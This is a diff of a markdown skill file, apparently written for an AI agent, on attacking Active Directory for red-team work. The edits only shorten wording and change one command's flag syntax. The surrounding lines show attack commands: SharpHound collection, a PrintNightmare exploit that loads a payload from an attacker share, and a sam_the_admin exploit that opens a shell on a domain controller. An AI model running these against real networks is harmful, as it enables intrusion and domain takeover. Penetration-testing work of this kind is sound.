@@ -1,6 +1,6 @@
 ---
 name: active-directory-attacks
-description: "Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing."
+description: "Provide techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing."
 risk: offensive
 date_added: "2026-02-27"
 version: 1.0.0
@@ -47,7 +47,7 @@ Provide comprehensive techniques for attacking Microsoft Active Directory enviro
 
 ---
 
-## Core Workflow
+## Workflow
 
 ### Step 1: Kerberos Clock Sync
 
@@ -67,7 +67,7 @@ sudo date -s "14 APR 2024 18:25:16"
 
 net time /domain /set
 
-# Fake clock without changing system time
+# Fake clock without changing time
 
 faketime -f '+8h' <command>
 ```
@@ -84,7 +84,7 @@ bloodhound --no-sandbox
 # Collect data with SharpHound
 
 .\SharpHound.exe -c All
-.\SharpHound.exe -c All --ldapusername user --ldappassword pass
+.\SharpHound.exe -c All -ldapusername user -ldappassword pass
 
 # Python collector (from Linux)
 
@@ -359,7 +359,7 @@ python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\ev
 
 ```bash
 
-# Automated exploitation
+# exploitation
 
 python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
 ```
